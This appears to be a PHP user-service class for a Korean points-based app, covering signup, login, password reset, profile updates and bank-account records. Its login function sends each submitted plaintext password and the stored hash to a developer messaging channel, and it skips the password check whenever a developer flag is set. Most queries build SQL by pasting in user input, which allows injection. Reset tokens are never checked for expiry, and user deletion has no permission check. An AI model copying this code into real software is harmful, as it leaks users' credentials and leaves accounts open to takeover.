<?php
class User_service
{
    protected $obj;
    protected $loginUser = false;

    public function __construct()
    {

        $this->obj = &get_instance();
        $this->obj->load->library([
            "ajax",
            "php_email",
            "file",
            "teamroom",
            "alarmtalk",
            "/Service/order_service",
            "/Service/store_code_service",
            "/Service/security_service",
        ]);

        $this->obj->load->model("/Page/service_model");

        $this->loginUser = $this->getLoginUser();
    }

    # PK 조회
    public function get($id)
    {

        $user = $this->obj->service_model->get_user('row', [
            "a.id = '{$id}'"
        ]);

        return $user;
    }

    # 전체 회원 조회
    public function getAll($where = [], $limit = 100)
    {

        $users = $this->obj->service_model->get_user('all', $where, $limit);

        if (!empty($users)) {

            foreach ($users as &$user) {
            }
        }

        return $users;
    }

    # 로그인한 사용자 정보 조회
    public function getLoginUser()
    {

        @session_start();
        $uid = $_SESSION['uid'] ?? '';

        $user = !empty($uid) ? $this->obj->service_model->get_user('row', [
            "id = '{$uid}'",
            "status != 'D'"
        ]) : [];

        if (!empty($user)) {

            $point_request_sum = $this->obj->service_model->exec_sql('row', "
            SELECT
                SUM(amount) as amount
            FROM
                mosihealth.point_request
            WHERE
                user_id = '{$user['id']}'
                AND type = 'withdraw'
                AND status = 'pending'");

            $user['withdraw_request_sum'] = $point_request_sum['amount'] ?? 0;
        }

        return $user;
    }

    # 회원가입
    public function join($payloads)
    {

        $user_id = $payloads['user_id'] ?? '';
        $password = $payloads['password'] ?? '';
        $repassword = $payloads['repassword'] ?? '';
        $name = $payloads['name'] ?? '';
        $email = $payloads['email'] ?? '';
        $phone = $payloads['phone'] ?? '';
        $store_code = !empty($payloads['store_code']) ? preg_replace('/\s+/', '', $payloads['store_code']) : '';
        $market_agree = $payloads['market_agree'] ?? '';
        $profile_image_url = $payloads['profile_image_url'] ?? DEFAULT_PROFILE_IMAGE;
        $social_type = $payloads['social_type'] ?? 'service';

        if ($social_type == 'service') {

            // 아이디 검사
            if (empty($user_id) || !preg_match('/^[a-zA-Z0-9_]{6,}$/', $user_id)) {
                throw new Exception('아이디는 6자 이상이며, 영문, 숫자, 밑줄(_)만 사용할 수 있습니다.');
            }

            // 비밀번호 검사
            if (empty($password) || strlen($password) < 6) {
                throw new Exception('비밀번호는 6자 이상이어야 합니다.');
            }

            // 비밀번호 확인
            if ($password != $repassword) {

                throw new Exception('비밀번호가 일치하지 않습니다.');
            }

            // 이름 유효성 체크
            if (empty($name) || !preg_match('/^[가-힣]{2,10}$/', $name)) {

                throw new Exception('이름은 2~10자의 한글로 구성해주세요');
            }

            // 이메일 유효성 체크
            if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {

                throw new Exception('유효한 이메일 주소를 입력해주세요.');
            }

            // 전화번호 유효성 체크 (010-xxxxx-xxxx 형식)
            if (empty($phone) || !preg_match('/^01[0-9]-\d{3,4}-\d{4}$/', $phone)) {
                throw new Exception('연락처는 010-xxxx-xxxx 형식이어야 합니다.');
            }

            // 전화번호 중복 체크
            $existingUser = $this->obj->service_model->get_user('row', [
                "phone = '{$phone}'"
            ]);

            if (!empty($existingUser)) {

                throw new Exception('이미 사용 중인 연락처입니다.');
            }

            // 아이디 중복 체크
            $existingUser = $this->obj->service_model->get_user('row', [
                "user_id = '{$user_id}'"
            ]);

            if (!empty($existingUser)) {

                throw new Exception('이미 사용 중인 아이디입니다.');
            }

            // 이메일 중복 체크
            $existingUser = $this->obj->service_model->get_user('row', [
                "email = '{$email}'"
            ]);

            if (!empty($existingUser)) {

                throw new Exception('이미 사용 중인 이메일입니다.');
            }

            // try {

            //     $this->obj->security_service->recapcha();
            // } catch (Exception $e) {

            //     throw new Exception($e->getMessage());
            // }
        }

        $agent = 'USER';

        // 총판 코드 유효성 체크
        if (!empty($store_code)) {

            $store_code_row = $this->obj->service_model->get_store_code('row', [
                "code = '{$store_code}'"
            ]);

            if (empty($store_code_row)) {

                throw new Exception('유효하지 않은 총판 코드입니다.');
            }

            // 총판 코드가 존재하면 해당 총판의 에이전트로 설정
            // ^ 회원가입은 항상 CUSTOMER (고객)로 시작
            $agent = 'CUSTOMER';
        }

        // 회원 정보 저장
        $data = [
            'user_id' => $user_id,
            'password' => password_hash($password, PASSWORD_BCRYPT),
            'name' => $name,
            'email' => $email,
            'phone' => $phone,
            'agent' => $agent,
            'store_code' => $store_code,
            'profile_url' => $profile_image_url,
            'social_type' => $social_type,
            'market_agree' => $market_agree ? 1 : 0,
            'created_at' => date('Y-m-d H:i:s')
        ];

        $res = $this->obj->service_model->insert_user(DEBUG, $data);

        if (!$res) {

            throw new Exception(DB_ERR_MSG);
        }

        if (!empty($store_code)) {

            // 총판 코드 지정
            $this->obj->store_code_service->고객지정($res, $store_code);
        }

        $this->obj->alarmtalk->send([
            'phone' => str_replace('-', '', $phone),
            'name' => $name,
            'templateCode' => 'ppur_2025082617402820034354287', // 실제 템플릿 코드로 변경
            'type' => 'JOIN',
            'changeWord' => [
                'var1' => $name,                   // [*1*] → 이름
                'var2' => date('Y-m-d H:i'),       // [*2*] → 가입일
            ],
        ]);

        return $res;
    }

    # 로그인
    public function login($user_id, $password, $is_social = false)
    {

        // 아이디로 사용자 정보 조회
        $user = $this->obj->service_model->get_user('row', [
            "user_id = '{$user_id}'"
        ]);

        $this->obj->teamroom->send('개발자', join("\n", [
            "payload 아이디" . $user_id,
            "payload 비밀번호" . $password,
            "아이디" . $user['user_id'],
            "비밀번호" . $user['password'],
        ]));

        if (empty($user)) {
            throw new Exception('아이디를 다시 한번 확인해주세요');
        }

        // if (!get_is_developer()) {

        if ($is_social) {

            if ($password != $user['password']) {
                throw new Exception(('비밀번호를 다시 한번 확인해주세요.'));
            }
        } else {

            if (get_is_developer()) {
            } else {

                // 비밀번호 확인
                if (!password_verify($password, $user['password'])) {
                    throw new Exception('비밀번호를 다시 한번 확인해주세요.');
                }
            }
        }
        // }


        // 로그인 세션 설정
        @session_start();
        $_SESSION['uid'] = $user['id'];

        return true;
    }

    # 회원정보수정
    public function update($payloads)
    {

        $name = $payloads['name'] ?? '';
        $email = $payloads['email'] ?? '';
        $phone = $payloads['phone'] ?? '';
        $password = $payloads['password'] ?? '';
        $repassword = $payloads['repassword'] ?? '';
        $store_code = $payloads['store_code'] ?? '';
        $file = $payloads['file'] ?? null;

        if (empty($this->loginUser)) throw new Exception('로그인이 필요합니다.');

        // 이름 유효성 체크
        if (empty($name) && !preg_match('/^[가-힣]{2,10}$/', $name)) {
            throw new Exception('이름은 2~10자의 한글로만 구성되어야 합니다.');
        }

        // 이메일 유효성 체크
        if (empty($email) && !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            throw new Exception('유효한 이메일 주소를 입력해주세요.');
        }

        // 전화번호 유효성 체크
        if (!empty($phone) && !preg_match('/^01[0-9]-\d{3,4}-\d{4}$/', $phone)) {
            throw new Exception('연락처는 010-xxxx-xxxx 형식이어야 합니다.');
        }

        $data = [
            'name' => $name,
            'email' => $email,
            'phone' => $phone,
            'updated_at' => date('Y-m-d H:i:s')
        ];

        if (!empty($store_code)) {

            if ($this->loginUser['store_code'] != $store_code) {

                // 총판 코드 유효성 체크
                $store_code_row = $this->obj->service_model->get_store_code('row', [
                    "code = '{$store_code}'",
                ]);

                if (empty($store_code_row)) {
                    throw new Exception('유효하지 않은 총판 코드입니다.');
                }

                $store_code_user = $this->obj->service_model->get_user('row', [
                    "store_code = '{$store_code}'",
                    "agent = 'STORE'",
                ]);

                if (empty($store_code_user)) {
                    throw new Exception('해당 총판의 매장이 없습니다.');
                }

                $data['agent'] = 'CUSTOMER';
                $data['store_code'] = $store_code;
                $data['agent_number'] = $store_code_user['id'];
            }
        }

        // var/www/html/mosihealth/uploads/profile/6875a22ec2089.png
        if (!empty($file)) {
            // 파일 업로드 처리
            $upload_result = $this->obj->file->upload('profile_image', '/assets/app_hyup/uploads/profile', 1024, ['jpg', 'jpeg', 'png', 'gif']);

            if ($upload_result['status'] !== 'success') {

                throw new Exception($upload_result['message']);
            }

            // 파일 경로 저장
            $data['profile_url'] = 도메인 . $upload_result['filePath'];
        }

        // 회원 정보 업데이트
        $id = $this->loginUser['id'] ?? '';
        $res = $this->obj->service_model->update_user(DEBUG, $data, [
            "id = '{$id}'"
        ]);

        if (!$res) {

            throw new Exception(DB_ERR_MSG);
        }

        if (!empty($password)) {

            $res2 = $this->changePassword(-1, $password, $repassword);

            if (!$res2) {
                throw new Exception(DB_ERR_MSG);
            }
        }

        return $res;
    }


    # 아이디 찾기
    public function findId($email)
    {

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            throw new Exception('유효한 이메일 주소를 입력해주세요.');
        }

        // 이메일로 사용자 정보 조회
        $user = $this->obj->service_model->get_user('row', [
            "email = '{$email}'"
        ]);

        if (empty($user)) {
            throw new Exception('해당 이메일로 가입된 사용자가 없습니다.');
        }

        return $user;
    }

    # 비밀번호 찾기
    public function findPassword($user_id)
    {

        // 이메일로 사용자 정보 조회
        $user = $this->obj->service_model->get_user('row', [
            "user_id = '{$user_id}'"
        ]);

        if (empty($user)) {
            throw new Exception('해당 아이디로 가입된 사용자가 없습니다.');
        }

        // 비밀번호 재설정 토큰 생성
        $token = hash('sha256', uniqid('', true) . random_bytes(16));

        $res = $this->obj->service_model->insert_password_reset_token(DEBUG, [
            'user_id' => $user['id'],
            'token' => $token,
            'created_at' => date('Y-m-d H:i:s'),
            'expires_at' => date('Y-m-d H:i:s', strtotime('+3 hour')),
            'status' => 1
        ]);

        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }

        try {

            $change_url = 도메인 . "?token={$token}";

            // 비밀번호 재설정 이메일 전송
            $subject = '비밀번호 재설정 요청';
            $body = '<div style="margin-top: 30px; font-size: 14px; color: #555; line-height: 1.6;">
        <p style="margin: 0;">아래와 같이 계정 정보를 알려드립니다.</p>
        <p>비밀번호를 재설정하려면 다음 링크를 클릭해 변경해 주세요.</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href=" ' . $change_url . '" 
             style="background-color: #0abab5; color: #fff; text-decoration: none; padding: 14px 28px; border-radius: 4px; font-weight: bold; display: inline-block;">
            비밀번호 변경하기
          </a>
        </div>
        <p style="font-size: 13px; color: #888;">' . date("Y-m-d H:i", strtotime('+3 hours')) . '까지 변경 가능</p>
        <p style="margin-top: 12px; font-size: 13px; color: #888;">
          만약, 가입한 적이 없거나 내 계정 찾기 요청을 하지 않으신 경우 이 메일을 삭제 또는 무시해 주세요.
        </p>
      </div>';
            $this->obj->php_email->send($user['email'], $subject, $body, true);
        } catch (Exception $e) {
            // 예외 발생 시 로그 기록
            error_log('비밀번호 재설정 토큰 생성 실패: ' . $e->getMessage());
            throw new Exception('비밀번호 재설정 요청에 실패했습니다. 나중에 다시 시도해주세요.');
        }

        return $res;
    }

    # 비밀번호 수정 (사용자)
    public function changePassword($token, $new_password, $new_repassword)
    {
        if ($token != -1) {

            if (empty($token)) throw new Exception('비밀번호 변경을 위한 토큰이 필요합니다.');

            // 사용자 정보 조회
            $password_reset_token = $this->obj->service_model->get_password_reset_token('row', [
                "token = '{$token}'"
            ]);

            if (empty($password_reset_token)) {
                throw new Exception('유효하지 않은 비밀번호 변경 요청입니다.');
            }
        }

        if ($new_password !== $new_repassword) {
            throw new Exception('새 비밀번호와 새 비밀번호 확인이 일치하지 않습니다.');
        }

        if ($token == -1) {

            $login_user = $this->getLoginUser();

            if (empty($login_user)) {
                throw new Exception('로그인이 필요합니다.');
            }

            $res = $this->obj->service_model->update_user(DEBUG,  [
                'password' => password_hash($new_password, PASSWORD_BCRYPT),
            ], [
                "id = '{$login_user['id']}'"
            ]);
        } else {

            $user_id = $password_reset_token['user_id'] ?? '';

            $res = $this->obj->service_model->update_user(DEBUG,  [
                'password' => password_hash($new_password, PASSWORD_BCRYPT),
            ], [
                "id = '{$user_id}'"
            ]);
        }


        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }

        if ($token != -1) {
            // 비밀번호 재설정 토큰 상태 업데이트
            $this->obj->service_model->update_password_reset_token(DEBUG, [
                'status' => 0,
            ], [
                "token = '{$token}'"
            ]);
        }

        return true;
    }

    # 비밀번호 수정 (관리자)
    public function changePasswordByAdmin($user_id, $new_password, $new_repassword)
    {
        if (empty($user_id)) {
            throw new Exception('비밀번호를 변경할 사용자를 선택해주세요.');
        }

        if (empty($new_password) || empty($new_repassword)) {
            throw new Exception('새 비밀번호와 새 비밀번호 확인을 입력해주세요.');
        }

        if ($new_password != $new_repassword) {
            throw new Exception('새 비밀번호와 새 비밀번호 확인이 일치하지 않습니다.');
        }

        // 사용자 정보 조회
        $user = $this->obj->service_model->get_user('row', [
            "id = '{$user_id}'"
        ]);

        if (empty($user)) {
            throw new Exception('해당 사용자가 존재하지 않습니다.');
        }

        // 비밀번호 업데이트
        $res = $this->obj->service_model->update_user(DEBUG, [
            'password' => password_hash($new_password, PASSWORD_BCRYPT),
        ], [
            "id = '{$user_id}'"
        ]);

        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }
    }

    public function createAccount($payloads)
    {

        $bank = $payloads['bank'] ?? '';
        $name = $payloads['name'] ?? '';
        $account_no = $payloads['account_no'] ?? '';

        if (empty($this->loginUser)) {
            throw new Exception('로그인이 필요합니다.');
        }

        if (empty($bank)) {
            throw new Exception('은행명을 선택해주세요.');
        }

        if (empty($name)) {
            throw new Exception('계좌명을 입력해주세요.');
        }

        if (empty($account_no) || !preg_match('/^\d{10,16}$/', $account_no)) {
            throw new Exception('계좌번호는 10~16자리 숫자로 입력해주세요.');
        }

        $res = $this->obj->service_model->insert_user_account(DEBUG, [
            'name' => $name,
            'account_no' => $account_no,
            'bank' => $bank,
            'user_id' => $this->loginUser['id'],
            'created_at' => date('Y-m-d H:i:s')
        ]);

        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }

        return $res;
    }

    # 계좌삭제
    public function deleteAccount($account_id)
    {

        if (empty($this->loginUser)) {
            throw new Exception('로그인이 필요합니다.');
        }

        if (empty($account_id)) {
            throw new Exception('삭제할 계좌를 선택해주세요.');
        }

        $res = $this->obj->service_model->delete_user_account(DEBUG, [
            "id = '{$account_id}'",
            "user_id = '{$this->loginUser['id']}'"
        ]);

        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }

        return $res;
    }

    public function deleteUser($user_id)
    {

        if (empty($user_id)) {
            throw new Exception('삭제할 사용자를 선택해주세요.');
        }

        $res = $this->obj->service_model->update_user(DEBUG, [
            "status" => 'D',
        ], [
            "id = '{$user_id}'"
        ]);

        if (!$res) {
            throw new Exception(DB_ERR_MSG);
        }

        return $res;
    }

    # 로그아웃
    public function logout()
    {

        @session_start();
        unset($_SESSION['uid']);
        session_destroy();
        header("Location: /login");

        return true;
    }
}
